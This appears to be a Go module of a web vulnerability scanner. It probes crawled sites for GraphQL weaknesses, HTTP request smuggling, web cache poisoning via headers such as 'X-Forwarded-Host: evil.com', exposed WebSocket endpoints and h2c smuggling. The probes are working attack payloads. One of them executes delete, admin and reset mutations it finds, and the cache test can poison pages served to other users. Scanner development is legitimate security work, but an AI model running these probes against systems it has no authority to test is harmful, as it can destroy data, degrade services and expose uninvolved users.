package scanner

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- GraphQL Full Suite ---

func scanGraphQL(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	gqlPaths := []string{"/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query", "/api/gql"}

	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		baseURL := strings.Split(page.URL, "/")[0] + "//" + strings.Split(page.URL, "/")[2]
		for _, path := range gqlPaths {
			endpoint := baseURL + path

			// Introspection
			introspection := `{"query":"{ __schema { types { name fields { name args { name type { name } } } } mutationType { fields { name args { name type { name } } } } } }"}`
			resp := http.Post(endpoint, "application/json", introspection)
			if resp.Err != nil || !strings.Contains(resp.Body, "__schema") {
				continue
			}

			findings = append(findings, Finding{
				Type: "GraphQL Introspection Enabled", Severity: "medium",
				URL: endpoint, Detail: "Full schema exposed via introspection",
				Template: "apex-graphql-introspection",
			})

			// Depth attack (DoS)
			depthQuery := `{"query":"{ __schema { types { fields { type { fields { type { fields { type { name } } } } } } } } }"}`
			dResp := http.Post(endpoint, "application/json", depthQuery)
			if dResp.Err == nil && dResp.Duration > 3*time.Second {
				findings = append(findings, Finding{
					Type: "GraphQL Depth Attack (DoS)", Severity: "high",
					URL: endpoint, Detail: fmt.Sprintf("Deep nested query took %.1fs — no depth limit", dResp.Duration.Seconds()),
					Template: "apex-graphql-dos",
				})
			}

			// Batching attack
			batchQuery := `[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]`
			bResp := http.Post(endpoint, "application/json", batchQuery)
			if bResp.Err == nil && bResp.StatusCode == 200 && strings.Count(bResp.Body, "__typename") >= 5 {
				findings = append(findings, Finding{
					Type: "GraphQL Batching Enabled — Rate Limit Bypass", Severity: "medium",
					URL: endpoint, Detail: "Server processes batched queries — can bypass per-request rate limits",
					Template: "apex-graphql-batch",
				})
			}

			// Mutation fuzzing
			var schema struct {
				Data struct {
					Schema struct {
						MutationType struct {
							Fields []struct {
								Name string `json:"name"`
							} `json:"fields"`
						} `json:"mutationType"`
					} `json:"__schema"`
				} `json:"data"`
			}
			json.Unmarshal([]byte(resp.Body), &schema)
			if schema.Data.Schema.MutationType.Fields != nil {
				for _, mut := range schema.Data.Schema.MutationType.Fields {
					if containsAny(strings.ToLower(mut.Name), []string{"delete", "remove", "admin", "update", "create", "reset"}) {
						mutQuery := fmt.Sprintf(`{"query":"mutation { %s }"}`, mut.Name)
						mResp := http.Post(endpoint, "application/json", mutQuery)
						if mResp.Err == nil && mResp.StatusCode == 200 && !strings.Contains(mResp.Body, "error") {
							findings = append(findings, Finding{
								Type: "GraphQL Dangerous Mutation Accessible", Severity: "critical",
								URL: endpoint, Detail: fmt.Sprintf("Mutation '%s' executable without auth", mut.Name),
								Template: "apex-graphql-mutation",
							})
						}
					}
				}
			}
			break // Found GraphQL endpoint
		}
	}
	return findings
}

// --- HTTP Request Smuggling ---

func scanHTTPSmuggling(cfg *engine.Config, _ *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	smuggleTests := []struct {
		name    string
		payload []byte
	}{
		{"CL.TE", []byte("POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG")},
		{"TE.CL", []byte("POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n")},
		{"TE.TE", []byte("POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG")},
		{"CL.0", []byte("POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\nContent-Length: 50\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n")},
	}

	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		parsed, _ := url.Parse(page.URL)
		if parsed == nil {
			continue
		}
		host := parsed.Hostname()
		port := "443"
		if parsed.Scheme == "http" {
			port = "80"
		}
		if parsed.Port() != "" {
			port = parsed.Port()
		}

		for _, test := range smuggleTests {
			payload := make([]byte, len(test.payload))
			copy(payload, test.payload)
			// Replace {host}
			payloadStr := strings.ReplaceAll(string(payload), "{host}", host)

			conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
			if err != nil {
				continue
			}
			if parsed.Scheme == "https" {
				tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: host})
				tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
				if tlsConn.Handshake() != nil {
					conn.Close()
					continue
				}
				conn = tlsConn
			}

			conn.SetDeadline(time.Now().Add(10 * time.Second))
			conn.Write([]byte(payloadStr))

			buf := make([]byte, 4096)
			n, _ := conn.Read(buf)
			conn.Close()

			if n > 0 {
				resp := string(buf[:n])
				// Detect smuggling indicators
				if strings.Contains(resp, "405") || strings.Contains(resp, "SMUGGLED") {
					findings = append(findings, Finding{
						Type: fmt.Sprintf("HTTP Request Smuggling (%s)", test.name), Severity: "critical",
						URL: page.URL, Detail: fmt.Sprintf("%s smuggling detected — response indicates request splitting", test.name),
						Template: "apex-smuggling",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- Cache Poisoning ---

func scanCachePoisoning(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	poisonHeaders := map[string]string{
		"X-Forwarded-Host":   "evil.com",
		"X-Forwarded-Scheme": "nothttps",
		"X-Original-URL":     "/admin",
		"X-Rewrite-URL":      "/admin",
		"X-Forwarded-Port":   "1337",
	}

	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		for header, value := range poisonHeaders {
			items := []engine.RequestItem{{
				URL:     page.URL,
				Method:  "GET",
				Headers: map[string]string{header: value},
			}}
			for resp := range http.BatchRequest(items, 1) {
				if resp.Err == nil && strings.Contains(resp.Body, value) {
					// Verify it's cached — request again without the header
					normalResp := http.Get(page.URL)
					if normalResp.Err == nil && strings.Contains(normalResp.Body, value) {
						findings = append(findings, Finding{
							Type: "Web Cache Poisoning", Severity: "critical",
							URL: page.URL, Detail: fmt.Sprintf("Header '%s: %s' poisoned the cache — reflected to other users", header, value),
							Template: "apex-cache-poison",
						})
					} else {
						findings = append(findings, Finding{
							Type: "Cache Poisoning Vector (Unkeyed Header)", Severity: "medium",
							URL: page.URL, Detail: fmt.Sprintf("Header '%s' reflected but not confirmed cached", header),
							Template: "apex-cache-poison-vector",
						})
					}
					break
				}
			}
		}
	}
	return findings
}

// --- WebSocket Injection ---

func scanWebSocket(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	wsPaths := []string{"/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
		"/cable", "/hub", "/realtime", "/live"}

	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		parsed, _ := url.Parse(page.URL)
		if parsed == nil {
			continue
		}
		wsScheme := "wss"
		if parsed.Scheme == "http" {
			wsScheme = "ws"
		}

		for _, path := range wsPaths {
			wsURL := fmt.Sprintf("%s://%s%s", wsScheme, parsed.Host, path)
			// Try TCP connection to check if WS endpoint exists
			conn, err := net.DialTimeout("tcp", parsed.Host+":"+parsed.Port(), 3*time.Second)
			if err != nil {
				continue
			}
			// Send WebSocket upgrade
			upgrade := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n", path, parsed.Host)
			conn.SetDeadline(time.Now().Add(5 * time.Second))
			conn.Write([]byte(upgrade))
			buf := make([]byte, 1024)
			n, _ := conn.Read(buf)
			conn.Close()

			if n > 0 && strings.Contains(string(buf[:n]), "101") {
				findings = append(findings, Finding{
					Type: "WebSocket Endpoint Found", Severity: "info",
					URL: wsURL, Detail: "WebSocket upgrade successful — test for injection manually",
					Template: "apex-websocket",
				})
			}
		}
	}
	return findings
}

// --- H2C Smuggling ---

func scanH2CSmuggling(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding

	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		// Try HTTP/2 cleartext upgrade
		items := []engine.RequestItem{{
			URL:    page.URL,
			Method: "GET",
			Headers: map[string]string{
				"Upgrade":    "h2c",
				"Connection": "Upgrade, HTTP2-Settings",
				"HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
			},
		}}
		for resp := range http.BatchRequest(items, 1) {
			if resp.Err == nil && resp.StatusCode == 101 {
				findings = append(findings, Finding{
					Type: "H2C Smuggling — HTTP/2 Cleartext Upgrade", Severity: "high",
					URL: page.URL, Detail: "Server accepts h2c upgrade — can bypass reverse proxy access controls",
					Template: "apex-h2c",
				})
			}
		}
	}
	return findings
}

func containsAny(s string, substrs []string) bool {
	for _, sub := range substrs {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}
